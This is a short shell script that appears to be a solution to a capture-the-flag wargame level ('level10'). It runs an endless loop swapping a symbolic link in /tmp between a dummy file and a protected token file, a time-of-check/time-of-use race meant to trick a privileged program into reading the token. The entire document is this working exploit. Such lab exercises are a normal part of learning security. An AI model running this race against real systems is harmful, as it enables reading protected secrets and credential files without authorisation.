#!/bin/sh
touch fail
chmod 755 fail
while [ true ];
do ln -f -s /tmp/level10/fail /tmp/level10/link;
ln -f -s /home/user/level10/token /tmp/level10/link;
done
